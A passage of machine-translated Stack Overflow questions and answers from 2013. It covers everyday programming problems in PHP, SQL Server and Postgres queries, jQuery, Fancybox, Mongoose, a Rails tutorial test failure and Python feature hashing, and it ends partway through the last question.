        <img width="96" height="96" src="http://localhost:8888/MindstreamBlog/wp-content/uploads/2013/01/Ian-clarke-headshot-1-150x150.png" class="avatar avatar-96 photo wp-post-image" alt="" />  <h5>Hunter Willis</h5><br />
    <h5>2012 Fall &amp; Spring</h5>
    </div>
    <h4>Posted on February 6th, 2013</h4>
    <br />
    <p><p>Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test [...]</p>
</p>
    <hr>
        <a href="http://localhost:8888/MindstreamBlog/?p=33"><h1>Test 2</h1></a>
    <div id="Author">
        <img width="96" height="96" src="http://localhost:8888/MindstreamBlog/wp-content/uploads/2013/01/Ian-clarke-headshot-1-150x150.png" class="avatar avatar-96 photo wp-post-image" alt="" />  <h5>Hunter Willis</h5><br />
    <h5>2012 Fall &amp; Spring</h5>
    </div>
    <h4>Posted on February 6th, 2013</h4>
    <br />
    <p><p>Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test [...]</p>
</p>
    <hr>
        <a href="http://localhost:8888/MindstreamBlog/?p=26"><h1>Test</h1></a>
    <div id="Author">
        <img width="96" height="96" src="http://localhost:8888/MindstreamBlog/wp-content/uploads/2013/01/Ian-clarke-headshot-1-150x150.png" class="avatar avatar-96 photo wp-post-image" alt="" />  <h5>Hunter Willis</h5><br />
    <h5>2012 Fall &amp; Spring</h5>
    </div>
    <h4>Posted on January 25th, 2013</h4>
    <br />
    <p><p>Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test testeroo! Test test [...]</p>
</p>
    <hr>
    </div>

<div id="WKTSel"> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:47:14.533

尝试删除嵌套段落并使规则自动关闭：

```
<?php the_excerpt(__('(more...)')); ?>
<hr /> 
```

# php - 在不相关的类之间共享函数

> ID：14916125
> 
> 赞同：4
> 
> 时间：2013-02-16T23:04:57.737
> 
> 标签：php, oop, class, traits

我仍在研究面向对象的编程并远离过程编程。虽然我使用类，但我知道我仍然没有完全 OOP 编写我的代码。我一直在阅读并尽我所能获得尽可能多的信息和练习，以提高我的能力，我正在取得进步，但我目前困惑的一个领域是如何处理一个独立的功能，它将可以在多个完全不相关的类中重用。

我知道我可以扩展类、实现接口或使用特征。我发现[这篇文章](https://stackoverflow.com/questions/9205083/php-traits-vs-interfaces)对澄清事情非常有帮助，但是我仍然很困惑在这种情况下使用的正确方法是什么。例如，我有一个函数将生成一个随机字母数字字符串，其长度由输入指定，并返回该字符串。几个不相关的类可以使用这个函数，在每个类中包含这个函数是没有意义的。

对我来说，最明显的是一个 trait 中的常用函数库，然后我可以根据需要在类中使用它。然而，这是正确的做事方式吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T23:13:10.767

是的，一点没错。

您不需要实用程序的特征，只需创建一个库。如果您想保持整洁并坚持面向对象的范式，请创建实用程序类，将`static`执行类似任务的多个方法组合在一起 - 而不是创建包含大量污染全局范围的函数的大型 PHP 文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T18:52:34.373

> 例如，我有一个函数将生成一个随机字母数字字符串，其长度由输入指定，并返回该字符串。几个不相关的类可以使用这个函数，在每个类中包含这个函数是没有意义的。

这不是一个函数。这是一种[责任](https://en.wikipedia.org/wiki/Single_responsibility_principle)。一个好的经验法则是在进行 OOP 时忘记函数的存在。你的功能是一个类`RandomAlphanumericStringGenerator`。它有一种方法`generate`可以接受`$length`作为输入，该方法将生成并返回字符串。创建该 Generator 的实例并将[其注入到需要 this 的对象中](https://stackoverflow.com/questions/6094744/dependency-hell-how-does-one-pass-dependencies-to-deeply-nested-objects/6095002#6095002)。

# sql-server-2008 - 如何将多行中的特定字段“合并”为单行中的多个不同字段？

> ID：14916126
> 
> 赞同：2
> 
> 时间：2013-02-16T23:04:59.603
> 
> 标签：sql-server-2008, tsql

**情况：** 3个源表：

**1\. 用户**（包含唯一 ID 和用户特定属性，如`firstName`、`givenName`、`StreetAddress`等）

**2\. MigrationFeatures**（包含唯一 ID 和`Feature_Name`）

**3\. Link_Users_and_Features**（包含来自`Users`和的唯一 ID`Features`以及`Status`列 (int) ）

在链接表中，每个用户的行数与`Feature`表中的行数完全相同，并且这些行中的每一行（每个用户）都链接到一个`Feature`。每个链接行还包含一个状态值列，该列可以具有不同的值 - 根据`Feature`特定用户的特定迁移状态。

**目标**：

拥有一个完全动态的查询/SP，它为每个用户返回一行，其中包含`Feature`该特定用户的每个用户的迁移状态 - 每个迁移状态列都应根据表`Feature_Name`中对应的`Feature`from命名`Features`。`Feature`当我在表中添加一个附加项时`Feature`，不必手动修改所需的查询代码。

提示：该`Feature`表已经有一个插入触发器，它为每个用户创建这个附加列，并且相关列上存在引用完整性，因此所有用户将始终在链接表中拥有所有对应的行`Features`。

**为什么我想要那个：**

到目前为止，我只有一个表，其中包含所有用户特定的列 ( `Name, givenName, StreetAddress,`etc) 以及所有迁移功能状态列 ( `SIDhist migrated, homefolder migrated,`etc)，其中包含所有用户的所有迁移状态数据。

不幸的是，这是完全静态的，每当我添加一个新的时`Feature`，我都必须修改这个主表。未来，不太熟练的人将使用底层系统，他们不会进入数据库代码或模式，而只会向表`Feature`和`user`表中添加记录。

这里是创建用户数据库的代码：

```
CREATE TABLE [dbo].[Users](
        [Users_ID] [int] IDENTITY(1,1) NOT NULL,
        [FMOUser_givenName] [nvarchar](max) NULL,
        [FMOUser_sn] [nvarchar](max) NULL,
        [FMOUser_streetAddress] [nvarchar](max) NULL,
        [ExcludeFromMigration] [bit] NULL,
     CONSTRAINT [PK_Users] PRIMARY KEY CLUSTERED 
    (
        [Users_ID] ASC
    )WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
    ) ON [PRIMARY]

    GO 
```

这里是创建特征表的代码：

```
CREATE TABLE [dbo].[Features](
    [Features_ID] [int] IDENTITY(1,1) NOT NULL,
    [Feature_Name] [nvarchar](max) NOT NULL
 CONSTRAINT [PK_Features] PRIMARY KEY CLUSTERED 
(
    [Features_ID] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]

GO 
```

创建链接表的代码：

```
CREATE TABLE [dbo].[link_Users__with__Features](
    [link_Users__with__Features_ID] [int] IDENTITY(1,1) NOT NULL,
    [FMO_Users_ID] [int] NOT NULL,
    [Features_Migration_Core_ID] [int] NOT NULL,
    [StatusValue] [int] NOT NULL,
    [Description] [nvarchar](max) NULL,
 CONSTRAINT [PK_link_Users__with__Features] PRIMARY KEY CLUSTERED 
(
    [link_Users__with__Features_ID] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY] 
```

我已经研究了什么？

我找到了以下示例：

[http://www.dbforums.com/microsoft-sql-server/1673127-view-multiple-records-single-row.html](http://www.dbforums.com/microsoft-sql-server/1673127-view-multiple-records-single-row.html)

这确实将多行中的单列放在新列名下的单行中，但它不是动态的 - 意味着：它不会从`Features`表中相应的“Feature”行中提取目标列名，也不能处理动态的数量`Features`。

由于我对 T-SQL 比较陌生，我不知道如何解决这个挑战。

由于这是我在堆栈溢出的第一个问题，如果我错过了形式，请原谅我。请纠正我，我会做得更好:-)

提示：我已经查找了针对我的问题提出的“重复”，但似乎没有一个与我的问题稍有匹配。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T11:27:08.230

以下代码完成了我在最初的问题中所要求的：（请注意，我引入了一个附加视图：view_Users_*和*_StatusValues 将用户、链接表和功能绑定在一起）

它的灵感来自：[http ://www.mssqltips.com/sqlservertip/2783/script-to-create-dynamic-pivot-queries-in-sql-server/](http://www.mssqltips.com/sqlservertip/2783/script-to-create-dynamic-pivot-queries-in-sql-server/)

代码：

```
use [your_database]

-- *** Get the column names for the target 'table' out from the features table
DECLARE @columns NVARCHAR(MAX), @sql NVARCHAR(MAX);
SET @columns = N'';
SELECT @columns += N',' + QUOTENAME(Feature_Name)
  FROM (SELECT p.Feature_Name FROM dbo.Features AS p
  INNER JOIN dbo.link_Users__with__Features AS o
  ON p.Features_ID = o.Features_ID
  GROUP BY p.Feature_Name) AS x;

-- *** remove unneccessary, leading ',' ***
set @columns = STUFF(REPLACE(@columns, ', p.[', ',['), 1, 1, '')
-- print @columns

-- *** Create the SQL code which will produce the correct output table ***
SET @sql = N'
select * from dbo.view_FMO_Users__and__StatusValues
pivot(
        max(StatusValue) -- use any aggregate function (needed for pivoting) 
        for Feature_Name in (' + @columns + ')) as FeatureStatusValue'

-- PRINT @sql;
EXEC sp_executesql @sql; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-04-14T15:37:21.533

对我个人来说请注意：如何从枢轴有意义的名称中给出输出列：

```
(select 
            Betrieb = [200], IP = [310], port = [311]    -- Give friendly names to output columns
 from 

(select i.INTERFACEID, ioptions.OPTION_IDENTIFIER, ioptions.value from 
(tac.I_A_INTERFACE_OPTIONS ioptions join tac.G_M_INTERFACES i on i.INTERFACEID = ioptions.INTERFACEID)
 where (OPTION_IDENTIFIER=200 or OPTION_IDENTIFIER=310 or OPTION_IDENTIFIER=311) and i.TYPE = 700) 
  temp

pivot(
        max(value) -- use any aggregate function (needed for pivoting) 
        for OPTION_IDENTIFIER in (
        [310],[311],[200])
        ) as output
) 
```

# php - 在while循环中工作的jquery弹出消息框

> ID：14916127
> 
> 赞同：1
> 
> 时间：2013-02-16T23:05:17.950
> 
> 标签：php, mysql

我有一个在 while 循环中工作的弹出消息框，但在弹出地址字段中，所有条目都显示相同的地址。

谁能告诉我我做错了什么？

**Html Jquery 脚本**

```
<script type="text/javascript">
$(document).ready(function() {
    $('#button').click(function(e) { 
        $('#modal').reveal({ 
            animation: 'fade',                   
            animationspeed: 600,                       
            closeonbackgroundclick: true,              
            dismissmodalclass: 'close'   
        });
    return false;
    });
});
</script>

<table>
$query1=mysql_query("select * from customers order by id desc");
while($row1=mysql_fetch_array($result))
{
?>
<tr>
<td><div align="center"><?php echo $row1['firstname']; ?></div></td>
<td><div align="center"><?php echo $row1['lastname']; ?></div></td>
<td><div align="center"><?php echo $row1['dob']; ?></div></td>
<td><div align="center"><?php echo $row1['email']; ?></div></td>
<td><div align="center"><a href="#" class="button">Address</a></div></td>
<td><div align="center"><?php echo $row1['phone']; ?></div></td>
<td><div align="center"><?php echo $row1['country']; ?></div></td>
<td><div align="center"><?php echo $row1['city']; ?></div></td>
</tr>

<Popup Start> 

<div id="modal">
<div id="heading">
Sign Up! Customer's Address
</div>
<div id="content">
<p><?php echo $row1['address']; ?></p>
</div>
</div>

<Popup End>

<?php }?>
</table> 
```

**弹出在表格的每一行中显示相同的地址**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:15:03.297

问题是您在每个 div 的弹出窗口中使用相同的 ID。因此，无论您调用什么代码来打开弹出窗口，它总是会打开第一个弹出窗口。你需要这样的东西：

```
<script type="text/javascript">
$(document).ready(function() {
    $('.button').click(function(e) { 
        id = $(this).attr('id').substr(3);
        //alert(id); //uncomment this line to check ID's are coming through fine.
        $('#modal' + id).reveal({ 
            animation: 'fade',                   
            animationspeed: 600,                       
            closeonbackgroundclick: true,              
            dismissmodalclass: 'close'   
        });
    return false;
    });
});
</script>

<table>
<?php
$i = 0;
$query1=mysql_query("select * from customers order by id desc");
while($row1=mysql_fetch_array($result))
{
?>
<tr>
<td><div align="center"><?php echo $row1['firstname']; ?></div></td>
<td><div align="center"><?php echo $row1['lastname']; ?></div></td>
<td><div align="center"><?php echo $row1['dob']; ?></div></td>
<td><div align="center"><?php echo $row1['email']; ?></div></td>
<td><div align="center"><a href="#" id="btn<?php echo $i; ?>" class="button">Address</a></div></td>
<td><div align="center"><?php echo $row1['phone']; ?></div></td>
<td><div align="center"><?php echo $row1['country']; ?></div></td>
<td><div align="center"><?php echo $row1['city']; ?></div></td>
</tr>

<Popup Start> 

<div class="modal" id="modal<?php echo $i++; ?>">
<div class="heading">
Sign Up! Customer's Address
</div>
<div class="content">
<p><?php echo $row1['address']; ?></p>
</div>
</div>

<Popup End>

<?php }?>
</table> 
```

注意其他 div 从 ID 到 Class 的变化。您应该只在一个页面上使用一次 ID。如果您多次重复使用某些东西，它应该是一个类。

你也贴错了标签。这是一个 Javascript / HTML 问题，而不是 PHP 问题。

# sql - 这个 SQL 查询应该如何构造？(Postgres)

> ID：14916131
> 
> 赞同：0
> 
> 时间：2013-02-16T23:05:49.323
> 
> 标签：sql, postgresql

我以前从来没有检查过这样的事情，所以我希望你们能提供帮助。我不确定是否最好创建一个临时表，然后检查其中是否有项目或是否有更好的方法。

表中的每一行代表一个可能有父对象的对象。父级存储在同一个表中。在此示例中， parent_id 字段保存行的父项的主键。我正在尝试选择表中类型列设置为特定值并且其父行在 field_b 列中具有“z”的所有行。括号中的部分显然需要工作......

```
SELECT s_id, s_text, s_parent_id
FROM sections 
WHERE s_derivedtype >= 10000 AND 
```

如果这返回任何东西

```
SELECT s_id
FROM sections
WHERE s_id = {the s_parent_id from the first query) AND s_flags LIKE '%z%' 
```

我已经更新了这个，希望更容易阅读......

最有效的方法是什么？我期望从表中的 18m 中返回 100k 行，因此体面的性能并非微不足道。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T23:16:52.960

```
SELECT key_field, field_a 
FROM
    t s
    inner join
    t p on p.key_field = s.key_field
WHERE
    s.type = 1
    AND p.field_b LIKE '%z%' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-16T23:16:28.317

尝试

```
SELECT t1.key_field, t1.field_a 
FROM tbl AS t1 
WHERE t1.type = 1 AND parent_id = (SELECT t2.id FROM tbl AS t2 
                                    WHERE t2.id = t1.parent_id
                                      AND t2.field_b LIKE '%z%') 
```

或者

```
SELECT t1.key_field, t1.field_a
FROM tbl AS t1 
INNER JOIN tbl AS t2 ON t2.id = t1.parent_id
WHERE t1.type = 1
AND t2.field_b LIKE '%z%' 
```

# javascript - 创建一个声明变量及其值的字符串（文本），用于 Javascript

> ID：14916137
> 
> 赞同：0
> 
> 时间：2013-02-16T23:06:44.583
> 
> 标签：javascript, asp.net

我弄乱了需要具有可变动态部分的 Javascript 代码。

我正在尝试替换这段 Javascript 代码：

```
var data = document.getElementById('IDofSomeHiddenField').value;
var print = document.getElementById('IDofOutputField');
print.value = data; 
```

有类似的东西：

```
var encapsulatedData = "var data = document.getElementById('IDofSomeHiddenField').value;";
var encapsulatedPrint = "var print = document.getElementById('IDofOutputField');"; 
```

这样当我在 Javascript 代码中的某处使用时：

```
encapsulatedData;
encapsulatedPrint; 
```

这将起作用：

```
print.value = data; 
```

但它不起作用。

有没有办法声明：

```
var encapsulatedData
var encapsulatedPrint 
```

以我上面写的类似方式，因此：

```
print.value = data; 
```

作品？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:10:46.880

我认为您有语法错误。您没有关闭第一行和第二行的括号。

```
var data = document.getElementById('IDofSomeHiddenField').value;
var print = document.getElementById('IDofOutputField');
print.value = data; 
```

像您尝试做的那样使用 JS 评估也是一种不好的形式。如果您真的想为返回页面元素的每个页面元素创建一个函数。ECMAScript 5 具有我认为您正在寻找的与您正在尝试做的事情的属性，但这不是 ECMAScript 3 JS 可以工作的方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T23:20:12.967

你的意思是神奇地创建全局变量吗？

```
function encapsulatedData() {
    window.data = document.getElementById('IDofSomeHiddenField').value;
}
function encapsulatedPrint() {
    window.print = document.getElementById('IDofOutputField');
}
encapsulatedData();
encapsulatedPrint();

print.value = data; 
```

这不是很卫生的代码，你想要的可能不是你应该做的。你能退一步说你的*目标*是什么，而不是达到那个目标的*手段吗？*我怀疑您真正想要使用的是闭包或返回一流的函数以进行延迟评估。

例如：

```
function makePrinter(id) {
    var outputfield = document.getElementById(id);
    return function(value) {
        outputfield.value = value;
    }
}
function getValue(id) {
    return document.getElementById('IDofSomeHiddenField').value;
}

var data = getValue('IDofOutputField');
var print = makePrinter('IDofOutputField');

print(data); 
```

# javascript - Fancybox 中的额外内容

> ID：14916138
> 
> 赞同：0
> 
> 时间：2013-02-16T23:06:48.267
> 
> 标签：javascript, jquery, fancybox

我想要一个 Fancybox 效果，显示：

图片、标题、段落

它只真正显示图像和标题。

如何在覆盖框中也显示一些文本？

```
<li>
<a class="fancybox" rel="projects" href="<?php the_field('image'); ?>" title="<?php the_title(); ?>">
<img src="<?php the_field('image'); ?>" alt="" />
</a>
<p>Some content...</p>      
</li>

$(".fancybox").fancybox({
        padding : 0,
        nextEffect : 'fade',
        prevEffect : 'fade',
        title : this.title,
        helpers : {
            title   : {
                type: 'outside'
            }
        }
    }); 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-18T17:23:18.667

fancybox的`title`属性可以设置为任何有效的 HTML。它实际上更像是一个标题，而不是一个正确的标题。因此，您可以执行以下操作：

```
 title = '<h1>' + this.title + '</h1><p>' + this.parent().children('p').html() + '</p>', 
```

然后你的幻想框将有一个类的 div，`fancybox-title`其中包含一个`h1`带有你的标题的元素和一个元素，它`p`是你的`li`. 我的示例的问题是，`children`它将返回作为元素子元素的每个段落`li`元素。因此，如果您的段落不止一个，`li`它会尝试将它们全部抓取。我建议重组 HTML，这样您的花式框标题中就可以有多个块级元素。将段落包含在具有特定类的 div 中，并将该类用作`children`方法中的选择器，以便您可以在其中放置多个段落或您真正想要的任何内容。如果您不需要多个段落，请为`p`在`children`方法中标记并选择它。

```
 <li>
      <a class="fancybox" rel="projects" href="<?php the_field('image'); ?>" title="<?php the_title(); ?>">
        <img src="<?php the_field('image'); ?>" alt="" />
      </a>
      <div class="caption">
        <p>Some content...</p>
      </div>      
    </li>

    $(".fancybox").fancybox({
        padding : 0,
        nextEffect : 'fade',
        prevEffect : 'fade',
        title : '<h1>' + this.title + '</h1>' + this.parent().children('.caption').html(),
        helpers : {
            title   : {
                type: 'outside'
            }
        }
    }); 
```

当然，您可以用`h1`您认为最合适的任何内容替换。将样式添加到您的 CSS 文件的标题和段落中，您就可以开始了 (`.fancybox-title h1 {}`和`.fancybox-title p {}`)。

# mongodb - 为什么在创建新模型时需要指定名称？

> ID：14916140
> 
> 赞同：3
> 
> 时间：2013-02-16T23:07:06.873
> 
> 标签：mongodb, mongoose

我刚刚开始学习 MongoDB 和 Mongoose，我无法理解`model`函数的第一个参数。为什么我需要指定一个字符串作为名称，它的目的是什么？

```
// Schema
var CustomerSchema =  mongoose.Schema({
    name: String
});

// Model, that is the constructor
var Customer = mongoose.model('Customer', CustomerSchema);

// Instance, a particular customer
var john = new Customer({}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T23:15:56.743

模型名称的小写复数版本用于与其关联的 MongoDB 集合的名称（例如`customers`在本例中）。

它还允许您的代码通过名称查找模型`mongoose.model('Customer')`。

# testing - Hartl RoR 章。9.3.1 规格测试失败

> ID：14916144
> 
> 赞同：1
> 
> 时间：2013-02-16T23:07:21.593
> 
> 标签：testing, ruby-on-rails-3.2, railstutorial.org

我似乎遇到了左右失败...我检查了我的代码，所有内容都已定义并且拼写检查正在检查...这是我的失败...：

```
Failures:

  1) User pages index should list each user
     Failure/Error: visit users_path
     ActionView::Template::Error:
       wrong number of arguments (2 for 1)
     # ./app/helpers/users_helper.rb:4:in `gravatar_for'
     # ./app/views/users/index.html.erb:7:in `block in _app_views_users_index_html_erb___3453469340594189774_70210782785680'
     # ./app/views/users/index.html.erb:5:in `each'
     # ./app/views/users/index.html.erb:5:in `_app_views_users_index_html_erb___3453469340594189774_70210782785680'
     # ./spec/requests/user_pages_spec.rb:12:in `block (3 levels) in <top (required)>'

  2) User pages index 
     Failure/Error: visit users_path
     ActionView::Template::Error:
       wrong number of arguments (2 for 1)
     # ./app/helpers/users_helper.rb:4:in `gravatar_for'
     # ./app/views/users/index.html.erb:7:in `block in _app_views_users_index_html_erb___3453469340594189774_70210782785680'
     # ./app/views/users/index.html.erb:5:in `each'
     # ./app/views/users/index.html.erb:5:in `_app_views_users_index_html_erb___3453469340594189774_70210782785680'
     # ./spec/requests/user_pages_spec.rb:12:in `block (3 levels) in <top (required)>'

  3) User pages index 
     Failure/Error: visit users_path
     ActionView::Template::Error:
       wrong number of arguments (2 for 1)
     # ./app/helpers/users_helper.rb:4:in `gravatar_for'
     # ./app/views/users/index.html.erb:7:in `block in _app_views_users_index_html_erb___3453469340594189774_70210782785680'
     # ./app/views/users/index.html.erb:5:in `each'
     # ./app/views/users/index.html.erb:5:in `_app_views_users_index_html_erb___3453469340594189774_70210782785680'
     # ./spec/requests/user_pages_spec.rb:12:in `block (3 levels) in <top (required)>'

Finished in 1.87 seconds
70 examples, 3 failures

Failed examples:

rspec ./spec/requests/user_pages_spec.rb:18 # User pages index should list each user
rspec ./spec/requests/user_pages_spec.rb:16 # User pages index 
rspec ./spec/requests/user_pages_spec.rb:15 # User pages index 
```

这是我的代码：spec/requests/user_pages_spec.rb

```
require 'spec_helper'

describe "User pages" do

  subject { page }

  describe "index" do
    before do
      sign_in FactoryGirl.create(:user)
      FactoryGirl.create(:user, name: "Bob", email: "bob@example.com")
      FactoryGirl.create(:user, name: "Ben", email: "ben@example.com")
      visit users_path
    end

    it { should have_selector('title', text: 'All users') }
    it { should have_selector('h1',    text: 'All users') }

    it "should list each user" do
      User.all.each do |user|
        page.should have_selector('li', text: user.name)
      end
    end
  end

  describe "profile page" do
    let(:user) { FactoryGirl.create(:user) }
    before { visit user_path(user) }

    it { should have_selector('h1',    text: user.name) }
    it { should have_selector('title', text: user.name) }
  end

  describe "signup page" do
    before { visit signup_path }

    it { should have_selector('h1',    text: 'Sign up') }
    it { should have_selector('title', text: full_title('Sign up')) }
  end

  describe "signup" do

    before { visit signup_path }

    let(:submit) { "Create my account" }

    describe "with invalid information" do
      it "should not create a user" do
        expect { click_button submit }.not_to change(User, :count)
      end
    end

    describe "with valid information" do
      before do
        fill_in "Name",         with: "Example User"
        fill_in "Email",        with: "user@example.com"
        fill_in "Password",     with: "foobar"
        fill_in "Confirmation", with: "foobar"
      end

      describe "after saving the user" do
        before { click_button submit }
        let(:user) { User.find_by_email('user@example.com') }

        it { should have_selector('title', text: user.name) }
        it { should have_selector('div.alert.alert-success', text: 'Welcome') }
        it { should have_link('Sign out') }
      end

        it "should create a user" do
         expect { click_button submit }.to change(User, :count).by(1)
      end
    end
  end

  describe "edit" do
    let(:user) { FactoryGirl.create(:user) }
    before do
      sign_in user
      visit edit_user_path(user)
    end

    describe "page" do
      it { should have_selector('h1',    text: "Update your profile") }
      it { should have_selector('title', text: "Edit user") }
      it { should have_link('change', href: 'http://gravatar.com/emails') }
    end

    describe "with invalid information" do
      before { click_button "Save changes" }

      it { should have_content('error') }
    end

    describe "with valid information" do
      let(:new_name)  { "New Name" }
      let(:new_email) { "new@example.com" }
      before do
        fill_in "Name",             with: new_name
        fill_in "Email",            with: new_email
        fill_in "Password",         with: user.password
        fill_in "Confirm Password", with: user.password
        click_button "Save changes"
      end

      it { should have_selector('title', text: new_name) }
      it { should have_selector('div.alert.alert-success') }
      it { should have_link('Sign out', href: signout_path) }
      specify { user.reload.name.should  == new_name }
      specify { user.reload.email.should == new_email }
    end
  end
end 
```

users_controller.rb

```
class UsersController < ApplicationController
  before_filter :signed_in_user, only: [ :index, :edit, :update]
  before_filter :correct_user,   only: [:edit, :update]

  def show
    @user = User.find(params[:id])
  end

  def new
    @user = User.new
  end

  def create
    @user = User.new(params[:user])
    if @user.save
      sign_in @user
      flash[:success] = "Welcome to the Sample App!"
      redirect_to @user
    else
      render 'new'
    end
  end

  def index
    @users = User.all
  end

  def edit
  end

  def update
    if @user.update_attributes(params[:user])
      flash[:success] = "Profile updated"
      sign_in @user
      redirect_to @user
    else
      render 'edit'
    end
  end

  private

    def signed_in_user
      unless signed_in?
        store_location
        redirect_to signin_url, notice: "Please sign in."
      end
    end

    def correct_user
      @user = User.find(params[:id])
      redirect_to(root_path) unless current_user?(@user)
    end
end 
```

index.html.erb：

```
<% provide(:title, 'All users') %>
<h1>All users</h1>

<ul class="users">
  <% @users.each do |user| %>
    <li>
      <%= gravatar_for user, size: 52 %>
      <%= link_to user.name, user %>
    </li>
  <% end %>
</ul> 
```

authentication_pages_spec.rb

```
require 'spec_helper'

describe "Authentication" do

  subject { page }

  describe "signin page" do
    before { visit signin_path }

    it { should have_selector('h1',    text: 'Sign in') }
    it { should have_selector('title', text: 'Sign in') }
  end

  describe "signin" do
    before { visit signin_path }

    describe "with invalid information" do
      before { click_button "Sign in" }

      it { should have_selector('title', text: 'Sign in') }
      it { should have_selector('div.alert.alert-error', text: 'Invalid') }

      describe "after visiting another page" do
        before { click_link "Home" }
        it { should_not have_selector('div.alert.alert-error') }
      end
    end

    describe "with valid information" do
      let(:user) { FactoryGirl.create(:user) }
      before { sign_in user }

      it { should have_selector('title', text: user.name) }

      it { should have_link('Users',    href: users_path) }
      it { should have_link('Profile',  href: user_path(user)) }
      it { should have_link('Settings', href: edit_user_path(user)) }
      it { should have_link('Sign out', href: signout_path) }

      it { should_not have_link('Sign in', href: signin_path) }

      describe "followed by signout" do
        before { click_link "Sign out" }
        it { should have_link('Sign in') }
      end
    end
  end

  describe "authorization" do

    describe "for non-signed-in users" do
      let(:user) { FactoryGirl.create(:user) }

      describe "in the Users controller" do

        describe "visiting the edit page" do
          before { visit edit_user_path(user) }
          it { should have_selector('title', text: 'Sign in') }
        end

        describe "submitting to the update action" do
          before { put user_path(user) }
          specify { response.should redirect_to(signin_path) }
        end

        describe "visiting the user index" do
          before { visit users_path }
          it { should have_selector('title', text: 'Sign in') }
        end
      end

      describe "when attempting to visit a protected page" do
        before do
          visit edit_user_path(user)
          fill_in "Email",    with: user.email
          fill_in "Password", with: user.password
          click_button "Sign in"
        end

        describe "after signing in" do

          it "should render the desired protected page" do
            page.should have_selector('title', text: 'Edit user')
          end
        end
      end
    end

    describe "as wrong user" do
      let(:user) { FactoryGirl.create(:user) }
      let(:wrong_user) { FactoryGirl.create(:user, email: "wrong@example.com") }
      before { sign_in user }

      describe "visiting Users#edit page" do
        before { visit edit_user_path(wrong_user) }
        it { should_not have_selector('title', text: full_title('Edit user')) }
      end

      describe "submitting a PUT request to the Users#update action" do
        before { put user_path(wrong_user) }
        specify { response.should redirect_to(root_path) }
      end
    end
  end
end 
```

sussions_helper.rb

```
module SessionsHelper

  def sign_in(user)
    cookies.permanent[:remember_token] = user.remember_token
    self.current_user = user
  end

  def signed_in?
    !current_user.nil?
  end

  def current_user=(user)
    @current_user = user
  end

  def current_user
    @current_user ||= User.find_by_remember_token(cookies[:remember_token])
  end

  def current_user?(user)
    user == current_user
  end

  def sign_out
    self.current_user = nil
    cookies.delete(:remember_token)
  end

  def redirect_back_or(default)
    redirect_to(session[:return_to] || default)
    session.delete(:return_to)
  end

  def store_location
    session[:return_to] = request.url
  end
end 
```

session_controller.rb

```
class SessionsController < ApplicationController

  def new
  end

  def create
    user = User.find_by_email(params[:session][:email].downcase)
    if user && user.authenticate(params[:session][:password])
      sign_in user
      redirect_back_or user
    else
      flash.now[:error] = 'Invalid email/password combination'
      render 'new'
    end
  end

  def destroy
    sign_out
    redirect_to root_url
  end
end 
```

这里有什么问题？？有什么建议么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T00:16:33.743

您需要清单 7.29 中的代码。它用于编辑头像。

> 清单 7.29。为 gravatar_for 助手定义一个可选的 :size 参数。
> 
> 应用程序/帮助者/users_helper.rb

```
module UsersHelper

  # Returns the Gravatar (http://gravatar.com/) for the given user.
  def gravatar_for(user, options = { size: 50 })
    gravatar_id = Digest::MD5::hexdigest(user.email.downcase)
    size = options[:size]
    gravatar_url = "https://secure.gravatar.com/avatar/#{gravatar_id}?s=#{size}"
    image_tag(gravatar_url, alt: user.name, class: "gravatar")
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-14T20:07:09.397

您的 user_pages 规范有这些不匹配的行

```
describe "index" do
    before do
      sign_in FactoryGirl.create(:user)
      FactoryGirl.create(:user, name: "Bob", email: "bob@example.com")
      FactoryGirl.create(:user, name: "Ben", email: "ben@example.com")
      visit users_path
    end 
```

第 9.3 章没有 Bob 电子邮件等

# python - 如何在python中实现词袋特征散列？

> ID：14916145
> 
> 赞同：1
> 
> 时间：2013-02-16T23:07:22.257
> 
> 标签：python, hash, machine-learning, nlp

我正在尝试对几千个文档进行分类，每个文档有几行。我以前使用过常规的词袋，但这次想使用散列技巧，我无法理解实现。我的数据中大约有 8000 个唯一词，所以我认为 128*128 应该足够了

我主要使用这些来源：

[http://blog.someben.com/2013/01/hashing-lang/](http://blog.someben.com/2013/01/hashing-lang/) [http://www.hpl.hp.com/techreports/2008/HPL-2008-91R1.pdf](http://www.hpl.hp.com/techreports/2008/HPL-2008-91R1.pdf)

这是我为每个文档生成特征向量的函数：

```
import mmh3

def add_doc(text):
    text = str.split(text)
    d_input = dict()
    for word in text:
        hashed_token = mmh3.hash(word) % 127
        d_input[hashed_token] = d_input.setdefault(hashed_token, 0) + 1
    return(d_input) 
```

